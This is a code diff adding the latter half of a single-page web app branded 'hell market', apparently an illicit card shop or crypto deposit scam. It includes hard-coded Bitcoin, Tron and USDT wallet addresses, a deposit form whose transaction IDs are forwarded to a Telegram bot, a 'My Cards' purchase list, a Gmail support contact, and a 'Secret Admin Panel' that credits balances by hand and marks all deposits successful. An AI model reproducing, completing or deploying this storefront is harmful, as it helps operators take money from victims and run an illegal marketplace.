+  setTimeout(() => { showDepositDetails(coin, amount); }, 1000);
+}
+
+function showDepositDetails(coin, amount){
+  const area = document.getElementById('depositArea');
+  let coinData = { net: 'Bitcoin Network', addr: '15MrQ9MBeFEuofrmC5fzSEVqbo7kSYVDQF', txLen: 64, rate: 0.000016 };
+  if(coin === 'TRX') coinData = { net: 'Tron (TRC20)', addr: 'TLsV22nP69k2D2mY8bZ49Lp11R7mKqWXY', txLen: 64, rate: 6.25 };
+  else if(coin === 'USDT') coinData = { net: 'BNB Smart Chain (BEP20)', addr: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F', txLen: 66, rate: 1.00 };
+  
+  currentDepositAddress = coinData.addr;
+  const cryptoConvertedAmt = (amount * coinData.rate).toFixed(coin === 'BTC' ? 6 : 2);
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(coinData.addr)}`;
+
+  area.innerHTML = `
+  <div class="panel" style="margin-top:20px; text-align:center;">
+    <p style="color:#aaa;">Payment session expires in:</p>
+    <div class="timer-box" id="timer">30:00</div>
+    <div class="crypto-convert-box">Send Exact: ${cryptoConvertedAmt} ${coin} ($${amount} USD)</div>
+    <img src="${qrUrl}" class="qr-img" alt="QR Code">
+    <p><b>Network:</b> ${coinData.net}</p>
+    <label style="font-size:12px; color:#aaa;">Deposit Address:</label>
+    <div class="copy-box">
+      <span class="copy-addr" id="cryptoAddrText">${coinData.addr}</span>
+      <button class="copy-btn" onclick="copyCryptoAddress()">COPY</button>
+    </div>
+    <div class="field" style="text-align:left;">
+      <label>Transaction ID (TXN) *</label>
+      <input id="txnInput" type="text" maxlength="${coinData.txLen}" placeholder="Enter TxID after payment">
+    </div>
+    <button class="cta" style="width:100%; margin-top:10px;" onclick="awaitingPaymentState(${amount})">Confirm Payment</button>
+  </div>`;
+  startTimer(30 * 60);
+}
+
+window.copyCryptoAddress = function(){
+  const addr = document.getElementById('cryptoAddrText').innerText;
+  navigator.clipboard.writeText(addr).then(() => toast('Address Copied!')).catch(() => toast('Failed to copy'));
+}
+
+function startTimer(duration) {
+  let timer = duration, minutes, seconds;
+  if(countdownTimer) clearInterval(countdownTimer);
+  countdownTimer = setInterval(() => {
+    minutes = parseInt(timer / 60, 10);
+    seconds = parseInt(timer % 60, 10);
+    minutes = minutes < 10 ? "0" + minutes : minutes;
+    seconds = seconds < 10 ? "0" + seconds : seconds;
+    const timerEl = document.getElementById('timer');
+    if(timerEl) timerEl.textContent = minutes + ":" + seconds;
+    if (--timer < 0) clearInterval(countdownTimer);
+  }, 1000);
+}
+
+window.awaitingPaymentState = async function(amount){
+  const txnEl = document.getElementById('txnInput');
+  const userTxid = txnEl ? txnEl.value.trim() : '';
+  if(!userTxid) return toast('Please enter TxID!');
+  
+  currentUserData.transactions.unshift({type:'Deposit',address:currentDepositAddress,txid:userTxid,amount:amount,status:'Pending',time:new Date().toLocaleString()});
+  await syncUserData();
+
+  sendToTelegram(`💰 <b>NEW DEPOSIT SUBMITTED</b>\n👤 <b>User:</b> <code>${currentUserData.user ? currentUserData.user.email : 'Local'}</code>\n💵 <b>Amount:</b> $${amount}\n🔗 <b>TxID:</b> <code>${userTxid}</code>`);
+
+  document.getElementById('depositArea').innerHTML = `<div class="panel" style="margin-top:20px; text-align:center;"><div class="spinner"></div><h3 style="color:#ff3b0b;">Awaiting Payment Confirmation...</h3><p style="color:#ccc;">Checking Blockchain Confirmations. Status: <b>Pending</b>.</p></div>`;
+  renderDepositHistoryTable();
+}
+
+function renderDepositHistoryTable(){
+  const sec = document.getElementById('depositHistorySection');
+  if(!sec) return;
+  const deposits = currentUserData.transactions.filter(t => t.type === 'Deposit');
+  if(deposits.length === 0) { sec.innerHTML = ''; return; }
+  sec.innerHTML = `
+  <div class="panel">
+    <h3 style="color:#ff3b12; margin-top:0;">Recent Deposits History</h3>
+    <div class="txn-table-wrapper">
+      <table class="txn-table">
+        <thead><tr><th>Address</th><th>TxID</th><th>Amount</th><th>Time</th><th>Status</th></tr></thead>
+        <tbody>
+          ${deposits.map(d=>`<tr><td style="color:#ff4b20">${escapeHtml(d.address)}</td><td style="color:#2cff7b">${escapeHtml(d.txid)}</td><td>$${d.amount}</td><td>${escapeHtml(d.time)}</td><td class="status-pending">${escapeHtml(d.status)}</td></tr>`).join('')}
+        </tbody>
+      </table>
+    </div>
+  </div>`;
+}
+
+function myCards(){
+  if(checkRoute()) return;
+  shell('mycards');
+  document.getElementById('content').innerHTML=commonTop()+`<h2 class="section-title">My Cards</h2>${currentUserData.cards.length?`<div class="cards">${currentUserData.cards.map(c=>`<article class="card"><div class="card-body"><h3>${escapeHtml(c.name)}</h3><div class="sub">Purchased for $${c.price}</div></div></article>`).join('')}</div>`:`<div class="panel empty" style="text-align:center;">🎫<br><br>No Cards Purchased Yet!</div>`}`+getFooter();
+}
+
+function support(){
+  if(checkRoute()) return;
+  shell('support');
+  document.getElementById('content').innerHTML=commonTop()+`
+  <div class="panel support">
+    <h2 class="section-title">Support Desk</h2>
+    <div class="notice" style="text-align:center;">📧 Support Email: <b style="color:#ff4b20;">hellmarketvercelszxzs@gmail.com</b></div>
+    <div class="field"><label>Message *</label><textarea id="supMsg" rows="4" placeholder="Type your query here..."></textarea></div>
+    <button class="cta" style="width:100%" onclick="sendSupportMail()">Send Support Request</button>
+  </div>`+getFooter();
+}
+
+window.sendSupportMail = function(){
+  const msg = document.getElementById('supMsg').value.trim();
+  if(!msg) return toast('Please enter a message');
+  window.location.href = `mailto:hellmarketvercelszxzs@gmail.com?subject=${encodeURIComponent('Support Request')}&body=${encodeURIComponent(msg)}`;
+  toast('Opening Email Client...');
+}
+
+function settings(){
+  if(checkRoute()) return;
+  shell('settings');
+  const p = currentUserData.profile || {};
+  document.getElementById('content').innerHTML=commonTop()+`
+  <div class="panel">
+    <h2 class="section-title">Settings</h2>
+    <div style="margin-top:20px;">
+      <h3 style="color:#ff3b12; border-bottom:1px solid #3d1515; padding-bottom:8px;">👤 My Profile</h3>
+      <div class="profile-grid">
+        <div class="field"><label>First Name</label><input id="profFN" type="text" value="${escapeHtml(p.firstName||'')}"></div>
+        <div class="field"><label>Last Name</label><input id="profLN" type="text" value="${escapeHtml(p.lastName||'')}"></div>
+      </div>
+      <div class="field"><label>Address</label><input id="profAddr" type="text" value="${escapeHtml(p.address||'')}"></div>
+      <button class="cta" style="width:100%; margin-top:15px;" onclick="saveProfile()">Save Profile</button>
+    </div>
+
+    <div style="margin-top:30px;">
+      <h3 style="color:#ff3b12; border-bottom:1px solid #3d1515; padding-bottom:8px;">🔐 Update Password</h3>
+      <div class="field"><label>Email *</label><input id="upEmail" type="email" placeholder="Confirm your exact email"></div>
+      <div class="field"><label>Current Password *</label><input id="upOldPass" type="password" placeholder="Enter old password"></div>
+      <div class="field"><label>New Password *</label><input id="upNewPass" type="password" placeholder="Enter new password (min 8 chars)"><div class="pass-hint">Minimum 8 characters required.</div></div>
+      <div class="field"><label>Re-enter New Password *</label><input id="upConfirmPass" type="password" placeholder="Re-enter new password"></div>
+      <button class="cta" style="width:100%; margin-top:15px;" onclick="updateUserPassword()">Update Password</button>
+    </div>
+  </div>`+getFooter();
+}
+
+window.saveProfile = async function(){
+  currentUserData.profile = {firstName:document.getElementById('profFN').value,lastName:document.getElementById('profLN').value,address:document.getElementById('profAddr').value};
+  await syncUserData();
+  toast('Profile updated successfully!');
+}
+
+window.updateUserPassword = async function(){
+  const email = document.getElementById('upEmail').value.trim();
+  const oldPass = document.getElementById('upOldPass').value;
+  const newPass = document.getElementById('upNewPass').value;
+  const confirmPass = document.getElementById('upConfirmPass').value;
+
+  if(!email || !oldPass || !newPass || !confirmPass) return toast('Please fill all password fields');
+  if(newPass !== confirmPass) return toast('New passwords do not match');
+  if(newPass.length < 8) return toast('New password must be at least 8 characters long');
+
+  try {
+    if(auth && auth.currentUser) {
+      const user = auth.currentUser;
+      const cred = firebase.auth.EmailAuthProvider.credential(email, oldPass);
+      await user.reauthenticateWithCredential(cred);
+      await user.updatePassword(newPass);
+    }
+    toast('Password updated successfully!');
+    document.getElementById('upOldPass').value = '';
+    document.getElementById('upNewPass').value = '';
+    document.getElementById('upConfirmPass').value = '';
+  } catch(err) {
+    toast('Failed: ' + err.message);
+  }
+}
+
+async function renderAdminPanel(){
+  root().innerHTML = `
+  <div style="padding: 20px; max-width: 1000px; margin: auto;">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+      <h1 style="color:#ff3b12; margin:0;">🛠️ Secret Admin Panel</h1>
+      <button class="cta" onclick="window.location.hash=''; window.location.reload();">Back to App</button>
+    </div>
+    <div class="panel">
+      <h3 style="color:#ffd700; margin-top:0;">All Registered Users & Balances</h3>
+      <div id="adminUsersList" style="text-align:center;"><div class="spinner"></div><p>Loading users from database...</p></div>
+    </div>
+  </div>`;
+
+  if(!db) {
+    document.getElementById('adminUsersList').innerHTML = `<p style="color:#ffcc00;">Local Preview Mode: Admin panel reads local session.</p>`;
+    return;
+  }
+
+  try {
+    const snapshot = await db.collection("users").get();
+    const usersContainer = document.getElementById('adminUsersList');
+    if(!snapshot.empty){
+      let html = `<div class="txn-table-wrapper"><table class="txn-table"><thead><tr><th>Email</th><th>Username</th><th>Current Balance</th><th>Action</th></tr></thead><tbody>`;
+      snapshot.forEach(doc => {
+        const u = doc.data();
+        const email = u.user ? u.user.email : 'N/A';
+        const username = u.user ? u.user.username : 'N/A';
+        const balance = u.balance || 0;
+        const uid = doc.id;
+        
+        html += `<tr>
+          <td>${escapeHtml(email)}</td>
+          <td>${escapeHtml(username)}</td>
+          <td style="color:#ffd700; font-weight:bold;">$${balance.toFixed(2)}</td>
+          <td>
+            <input type="number" id="addAmt_${uid}" placeholder="Amount" style="width:80px; padding:4px; background:#222; color:#fff; border:1px solid #555; border-radius:4px;" value="100">
+            <button class="cta" style="padding:5px 10px; font-size:11px;" onclick="adminAddBalance('${uid}')">＋ Add Balance</button>
+          </td>
+        </tr>`;
+      });
+      html += `</tbody></table></div>`;
+      usersContainer.innerHTML = html;
+    } else {
+      usersContainer.innerHTML = `<p style="color:#aaa;">No users registered yet.</p>`;
+    }
+  } catch(e) {
+    document.getElementById('adminUsersList').innerHTML = `<p style="color:#ff3b0b;">Error loading users: ${e.message}</p>`;
+  }
+}
+
+window.adminAddBalance = async function(uid){
+  const inputEl = document.getElementById(`addAmt_${uid}`);
+  const amt = Number(inputEl ? inputEl.value : 0);
+  if(!amt || amt <= 0) return toast('Please enter a valid amount!');
+
+  try {
+    const userRef = db.collection("users").doc(uid);
+    const docSnap = await userRef.get();
+    if(docSnap.exists){
+      const data = docSnap.data();
+      const currentBal = data.balance || 0;
+      const newBal = currentBal + amt;
+      let txns = data.transactions || [];
+      txns.forEach(t => { if(t.type === 'Deposit') t.status = 'Successful'; });
+
+      await userRef.update({ balance: newBal, transactions: txns });
+      toast(`Successfully added $${amt} to user balance!`);
+      renderAdminPanel();
+    }
+  } catch(e) {
+    toast('Error: ' + e.message);
+  }
+}
+
+window.logout = async function(){
+  if(auth) await auth.signOut();
+  localStorage.removeItem('hell_local_user');
+  currentUserData = { user: null, balance: 0, transactions: [], cards: [], profile: {} };
+  authView('login');
+}
+
+function escapeHtml(s){return String(s||'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]||m))}
+
+let appInitialized = false;
+
+function loadFallbackOrDashboard(user) {
+  if (appInitialized) return;
+  appInitialized = true;
+  
+  if (user) {
+    db.collection("users").doc(user.uid).get().then(docSnap => {
+      if(docSnap.exists) currentUserData = docSnap.data();
+      else currentUserData = { user: { uid: user.uid, username: user.email.split('@')[0], email: user.email }, balance: 0, transactions: [], cards: [], profile: {} };
+      dashboard();
+    }).catch(() => {
+      dashboard();
+    });
+  } else {
+    const localSaved = localStorage.getItem('hell_local_user');
+    if(localSaved) {
+      try { currentUserData = JSON.parse(localSaved); } catch(e){}
+      dashboard();
+    } else {
+      renderIntroLanding();
+    }
+  }
+}
+
+try {
+  setTimeout(() => {
+    if (!appInitialized) {
+      loadFallbackOrDashboard(null);
+    }
+  }, 2000);
+
+  if(auth) {
+    auth.onAuthStateChanged((user) => {
+      if(checkRoute()) return;
+      loadFallbackOrDashboard(user);
+    });
+  } else {
+    loadFallbackOrDashboard(null);
+  }
+} catch(initErr) {
+  loadFallbackOrDashboard(null);
+}
+</script>
+</body>
+</html>
